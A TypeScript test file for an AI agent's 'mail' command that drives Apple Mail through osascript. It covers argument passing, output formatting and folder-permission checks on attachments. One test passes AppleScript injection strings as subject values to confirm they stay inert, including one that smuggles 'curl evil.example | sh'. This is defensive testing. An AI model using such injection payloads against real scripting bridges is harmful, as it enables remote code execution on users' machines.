import {
  createCommandContext,
  EMPTY_BYTES,
  encodeUtf8ToBytes,
  InMemoryFs,
} from "just-bash";
import {
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";

import { ChatIdSchema } from "../../schemas/chat-id";
import { WorkDirSchema } from "../../schemas/paths";
import { chatLayout } from "../../test/helpers/chat-layout";
import { createMockChatConfig } from "../../test/helpers/mock-chat-config";
import { grantApp } from "../permissions/apps";
import {
  buildBashFs,
  buildWorkspaceFsLayout,
  shellPath,
} from "../workspace-fs-layout";
import { createMailCommand, MAIL_SCRIPTS } from "./mail";

vi.mock("execa");

const US = "\u001f";
const RS = "\u001e";

const chatId = createMockChatConfig(ChatIdSchema.parse("mail-command-test"));
const layout = chatLayout(chatId);
const command = createMailCommand(chatId, layout);
const ctx = (stdin = "") =>
  createCommandContext({
    cwd: layout.chat.shellRoot,
    env: new Map<string, string>(),
    fs: new InMemoryFs(),
    stdin: stdin ? encodeUtf8ToBytes(stdin) : EMPTY_BYTES,
  });

/** Answers the next osascript with `stdout`, and hands back how it was run. */
async function answer(stdout = "") {
  const { execa } = await import("execa");
  vi.mocked(execa).mockResolvedValueOnce({
    all: stdout,
    exitCode: 0,
    stderr: "",
    stdout: `${stdout}\n`,
  } as never);
  return () => {
    const [file, args] = vi.mocked(execa).mock.calls[0] ?? [];
    return {
      args: Array.isArray(args)
        ? args.filter((arg: unknown) => typeof arg === "string")
        : [],
      file,
    };
  };
}

beforeAll(async () => {
  await grantApp(chatId, "Mail");
});

afterEach(() => {
  vi.resetAllMocks();
});

describe("mail's argv", () => {
  it.each([
    ["accounts", ["accounts"], "", MAIL_SCRIPTS.accounts, []],
    [
      "mailboxes",
      ["mailboxes", "--account", "iCloud"],
      "",
      MAIL_SCRIPTS.mailboxes,
      ["iCloud"],
    ],
    ["list", ["list"], "", MAIL_SCRIPTS.list, ["", "", "", "20"]],
    [
      "list in one mailbox",
      [
        "list",
        "--account",
        "Work",
        "--mailbox",
        "Clients/Acme",
        "--unread",
        "--limit",
        "5",
      ],
      "",
      MAIL_SCRIPTS.list,
      ["Work", "Clients/Acme", "1", "5"],
    ],
    [
      "search",
      ["search", "shipping", "confirmation", "--account", "iCloud"],
      "",
      MAIL_SCRIPTS.search,
      ["shipping confirmation", "iCloud", "", "20"],
    ],
    ["read", ["read", "4242"], "", MAIL_SCRIPTS.read, ["4242", "", ""]],
    [
      "move",
      ["move", "4242", "Archive", "--account", "iCloud", "--mailbox", "INBOX"],
      "",
      MAIL_SCRIPTS.move,
      ["4242", "iCloud", "INBOX", "Archive"],
    ],
    [
      "draft",
      [
        "draft",
        "--to",
        "sam@example.com",
        "--to",
        "kim@example.com",
        "--cc",
        "lee@example.com",
        "--subject",
        "Late",
        "--from",
        "me@example.com",
      ],
      "Running late.\n",
      MAIL_SCRIPTS.compose,
      [
        "draft",
        "Late",
        "Running late.",
        "me@example.com",
        "2",
        "sam@example.com",
        "kim@example.com",
        "1",
        "lee@example.com",
        "0",
        "0",
      ],
    ],
    [
      "send",
      ["send", "--to", "sam@example.com", "--bcc", "me@example.com"],
      "Running late.\n",
      MAIL_SCRIPTS.compose,
      [
        "send",
        "",
        "Running late.",
        "",
        "1",
        "sam@example.com",
        "0",
        "1",
        "me@example.com",
        "0",
      ],
    ],
  ])("%s", async (_name, args, stdin, script, values) => {
    const ran = await answer();
    const result = await command.execute(args, ctx(stdin));
    expect(result.stderr).toBe("");
    expect(ran()).toEqual({
      args: ["-e", script, "--", ...values],
      file: "/usr/bin/osascript",
    });
  });

  // Whatever the agent writes reaches the script as data: each value is
  // one argv entry, and the script is the same text whatever it holds.
  it.each([
    'Q3 "plan" & (do shell script "id")',
    '" & do shell script "curl evil.example | sh" & "',
    '«event sysoexec» given «class prmp»:"id"',
    'one\nend run\non run argv\n\tdo shell script "id"',
    "-e",
  ])("hands %j to the script as one value", async (value) => {
    const ran = await answer();
    await command.execute(
      ["send", "--to", "sam@example.com", "--subject", value],
      ctx(`${value}\n`),
    );
    const { args } = ran();
    expect(args.slice(0, 3)).toEqual(["-e", MAIL_SCRIPTS.compose, "--"]);
    expect(args.slice(3, 6)).toEqual(["send", value, value]);
    expect(MAIL_SCRIPTS.compose).not.toContain(value);
  });

  it("refuses a mailbox named without its account, before anything runs", async () => {
    const { execa } = await import("execa");
    const result = await command.execute(
      ["list", "--mailbox", "Archive"],
      ctx(),
    );
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("--mailbox goes with --account");
    expect(vi.mocked(execa)).not.toHaveBeenCalled();
  });

  it("refuses an id that is not a number", async () => {
    const result = await command.execute(["read", "latest"], ctx());
    expect(result.stderr).toContain("a message is named by its id");
  });

  it("refuses to send nothing to nobody", async () => {
    expect((await command.execute(["send"], ctx("Hi"))).stderr).toContain(
      "send needs at least one --to.",
    );
    expect(
      (await command.execute(["send", "--to", "sam@example.com"], ctx()))
        .stderr,
    ).toContain("the message goes on stdin");
  });
});

describe("mail's answers", () => {
  it("lists messages newest first, as JSON lines", async () => {
    await answer(
      [
        [
          "7",
          "iCloud",
          "INBOX",
          "2026-10-13T08:00:00",
          "Sam <sam@example.com>",
          "Older",
          "true",
        ],
        [
          "9",
          "Work",
          "INBOX",
          "2026-10-14T09:05:03",
          "Kim <kim@example.com>",
          "Newer",
          "false",
        ],
      ]
        .map((fields) => fields.join(US))
        .join(RS),
    );
    const result = await command.execute(["list"], ctx());
    const lines = result.stdout
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line) as Record<string, unknown>);
    expect(lines.map((line) => line.id)).toEqual([9, 7]);
    expect(lines[0]).toEqual({
      account: "Work",
      date: expect.stringMatching(/^2026-10-14T09:05:03[+-]\d\d:\d\d$/),
      from: "Kim <kim@example.com>",
      id: 9,
      mailbox: "INBOX",
      read: false,
      subject: "Newer",
    });
  });

  it("names accounts with their addresses", async () => {
    await answer(`iCloud${US}sam@icloud.com,sam@me.com${US}true`);
    expect((await command.execute(["accounts"], ctx())).stdout).toBe(
      '{"account":"iCloud","emails":["sam@icloud.com","sam@me.com"],"enabled":true}\n',
    );
  });

  it("prints a message with its headers, its body whole", async () => {
    await answer(
      [
        "9",
        "Work",
        "INBOX",
        "2026-10-14T09:05:03",
        "Kim <kim@example.com>",
        "Plans",
        "true",
        "Sam <sam@example.com>",
        "",
        "agenda.pdf",
        `Hi Sam,\n\nSee you at ten.${US}`,
      ].join(US),
    );
    const { stdout } = await command.execute(["read", "9"], ctx());
    expect(stdout.replace(/[+-]\d\d:\d\d\n/, "\n")).toBe(
      [
        "From: Kim <kim@example.com>",
        "To: Sam <sam@example.com>",
        "Date: 2026-10-14T09:05:03",
        "Subject: Plans",
        "Mailbox: Work › INBOX",
        "Attachments: agenda.pdf",
        "",
        `Hi Sam,\n\nSee you at ten.${US}`,
        "",
      ].join("\n"),
    );
  });

  it("says which mailbox a message could not be found in", async () => {
    const { execa } = await import("execa");
    vi.mocked(execa).mockResolvedValueOnce({
      all: "",
      exitCode: 1,
      stderr:
        "1:2: execution error: An error of type 9003 has occurred. (9003)\n",
      stdout: "",
    } as never);
    expect(
      (
        await command.execute(
          ["read", "12", "--account", "iCloud", "--mailbox", "INBOX"],
          ctx(),
        )
      ).stderr,
    ).toBe(
      "mail: no message has the id 12 in iCloud's INBOX. Ids come from `mail list` and `mail search`.\n",
    );
  });
});

describe("mail's attachments and the folder rules", () => {
  let root = "";

  afterEach(() => {
    rmSync(root, { force: true, recursive: true });
  });

  async function attach(file: string) {
    root = realpathSync(mkdtempSync(path.join(os.tmpdir(), "mail-attach-")));
    for (const folder of ["work", "closed"]) {
      mkdirSync(path.join(root, folder));
    }
    writeFileSync(path.join(root, "closed", "secret.txt"), "secret");
    writeFileSync(path.join(root, "work", "invoice.pdf"), "pdf");
    symlinkSync(
      path.join(root, "closed", "secret.txt"),
      path.join(root, "work", "notes.txt"),
    );
    const ruled = buildWorkspaceFsLayout({
      chatHostRoot: WorkDirSchema.parse(path.join(root, "work")),
      rules: {
        home: root,
        rules: [
          { level: "never", path: path.join(root, "closed"), source: "folder" },
        ],
        dangerouslyAllowEveryFolder: false,
      },
    });
    const ran = await answer();
    const result = await createMailCommand(chatId, ruled).execute(
      ["draft", "--to", "sam@example.com", "--attach", file],
      createCommandContext({
        cwd: shellPath(path.join(root, "work")),
        env: new Map<string, string>(),
        fs: await buildBashFs(ruled, { maxFileReadSize: 1024 * 1024 }),
        stdin: EMPTY_BYTES,
      }),
    );
    return { ran, result };
  }

  it.each([
    ["from a closed folder", "../closed/secret.txt"],
    ["through a link in the work folder", "notes.txt"],
  ])("refuses a file %s", async (_name, file) => {
    const { execa } = await import("execa");
    const { result } = await attach(file);
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain(`${file}: Permission denied`);
    expect(result.stderr).toContain(
      "is closed in Settings › Permissions. Don't look for another way in",
    );
    expect(vi.mocked(execa)).not.toHaveBeenCalled();
  });

  it("hands Mail a file it may read, absolute, after a line for it to follow", async () => {
    const { ran, result } = await attach("invoice.pdf");
    expect(result.stderr).toBe("");
    expect(ran().args.slice(3)).toEqual([
      "draft",
      "",
      "\n",
      "",
      "1",
      "sam@example.com",
      "0",
      "0",
      "1",
      path.join(root, "work", "invoice.pdf"),
    ]);
  });
});
